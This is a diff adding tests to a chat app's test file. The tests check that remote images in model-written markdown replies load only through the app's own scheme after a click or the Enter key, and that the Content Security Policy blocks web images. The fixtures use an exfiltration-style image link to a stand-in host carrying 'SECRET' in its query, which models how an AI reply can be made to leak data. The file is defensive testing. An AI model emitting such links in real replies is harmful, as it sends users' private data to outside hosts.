@@ -116,6 +116,14 @@
     ok(img, 'click loads through the app scheme');
     ok(img.src.includes('k=' + encodeURIComponent(window.__remoteKey)) && img.src.includes(encodeURIComponent('https://evil.example/?q=SECRET')), 'key and url carried');
     ok(!/https:/.test(document.querySelector('meta[http-equiv="Content-Security-Policy"]').content.match(/img-src[^;]*/)[0]), 'CSP allows no http(s) images');
+    // An image the learner loaded stays loaded when the reply is drawn again.
+    const again = show('![x](https://evil.example/?q=SECRET)');
+    ok($('img[src^="teacher-remote:"]', again), 'a loaded image survives a re-render');
+    // The keyboard loads one too.
+    const kb = show('![y](https://keyboard.example/a.png)');
+    const ph2 = $('.remote-img', kb); ok(ph2, 'placeholder');
+    ph2.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }));
+    ok($('img[src^="teacher-remote:"]', kb), 'Enter loads the image');
   });
 
   test('model HTML cannot name the app image scheme or fake the placeholder', () => {
